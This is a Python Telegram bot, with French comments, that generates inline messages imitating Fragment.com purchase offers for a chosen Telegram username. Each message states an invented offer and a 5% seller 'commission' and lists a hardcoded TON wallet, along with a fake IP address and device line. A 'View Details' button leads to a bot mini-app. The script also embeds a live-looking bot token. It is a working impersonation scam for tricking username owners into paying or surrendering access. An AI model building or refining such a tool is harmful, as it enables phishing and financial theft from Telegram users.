import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
BOT_USERNAME = "DirectOfferNotification_bot"  # 🔗 Nom de votre bot

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"🤖 Bot: @{BOT_USERNAME}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    py_start = fragment_message.find(offer_text)
    if py_start != -1:
        prefix = fragment_message[:py_start]
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=len(prefix.encode('utf-16-le')) // 2,
            length=len(offer_text.encode('utf-16-le')) // 2
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    py_start = fragment_message.find(commission_text)
    if py_start != -1:
        prefix = fragment_message[:py_start]
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=len(prefix.encode('utf-16-le')) // 2,
            length=len(commission_text.encode('utf-16-le')) // 2
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    py_start = fragment_message.find(important_text1)
    if py_start != -1:
        prefix = fragment_message[:py_start]
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=len(prefix.encode('utf-16-le')) // 2,
            length=len(important_text1.encode('utf-16-le')) // 2
        ))
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    py_start = fragment_message.find(important_text2)
    if py_start != -1:
        prefix = fragment_message[:py_start]
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=len(prefix.encode('utf-16-le')) // 2,
            length=len(important_text2.encode('utf-16-le')) // 2
        ))
    
    # 5. Wallet cliquable
    py_start = fragment_message.find(wallet_address)
    if py_start != -1:
        prefix = fragment_message[:py_start]
        utf16_offset = len(prefix.encode('utf-16-le')) // 2
        utf16_length = len(wallet_address.encode('utf-16-le')) // 2
        entities.append(MessageEntity(
            type=MessageEntity.TEXT_LINK,
            offset=utf16_offset,
            length=utf16_length,
            url=f"https://tonviewer.com/{wallet_address}"
        ))
        print(f"🔗 Wallet link: position UTF-16 {utf16_offset}, longueur {utf16_length}")
    
    # 📱 BOUTON STARTAPP - Génère un lien t.me avec startapp
    startapp_param = f"{username}-{price:g}"
    startapp_url = f"https://t.me/{BOT_USERNAME}/request?startapp={startapp_param}"
    
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton(
            "View Details", 
            url=startapp_url
        )
    ]])
    
    print(f"🔗 StartApp URL générée: {startapp_url}")
    
    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        
        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if not query:
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        
        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if len(parts) < 2:
            await update.inline_query.answer([], cache_time=0)
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
        except ValueError:
            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Génération du message avec le format exact du bot original
        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
        
        # Prix actuel pour l'affichage
        current_ton_price = get_ton_price()
        current_usd_value = ton_amount * current_ton_price
        
        # Résultat inline - SEULEMENT si format correct
        results = [
            InlineQueryResultArticle(
                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                title=f"Fragment Deal: @{username}",
                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                input_message_content=InputTextMessageContent(
                    fragment_message,
                    entities=entities,
                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
                ),
                reply_markup=keyboard
            )
        ]
        
        await update.inline_query.answer(results, cache_time=0)
        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
        
    except Exception as e:
        print(f"❌ Erreur dans inline_query_handler: {e}")

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire webhook HTTP simple"""
    
    def do_POST(self):
        """Gestion des requêtes POST"""
        global app, event_loop
        
        try:
            if self.path != f'/{BOT_TOKEN}':
                self.send_response(404)
                self.end_headers()
                return
            
            # Lecture des données
            content_length = int(self.headers.get('content-length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse JSON
            update_data = json.loads(post_data.decode('utf-8'))
            
            # Traitement asynchrone
            if app and event_loop:
                asyncio.run_coroutine_threadsafe(
                    process_update(update_data),
                    event_loop
                )
            
            # Réponse OK
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status simple"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n🔗 StartApp: t.me/{BOT_USERNAME}/request"
        self.wfile.write(status.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

async def process_update(update_data):
    """Traitement des updates Telegram"""
    global app
    
    try:
        if app:
            update = Update.de_json(update_data, app.bot)
            if update:
                await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement update: {e}")

def run_webhook_server():
    """Démarre le serveur webhook"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur webhook: {e}")

async def setup_bot():
    """Configuration du bot"""
    global app, event_loop
    
    try:
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout du gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Initialisation
        await app.initialize()
        await app.start()
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        await app.bot.set_webhook(url=webhook_url)
        
        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
        
        # Garde l'event loop actif
        event_loop = asyncio.get_event_loop()
        
        # Démarrage du serveur webhook dans un thread séparé
        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
        webhook_thread.start()
        
        # Attente infinie
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup bot: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
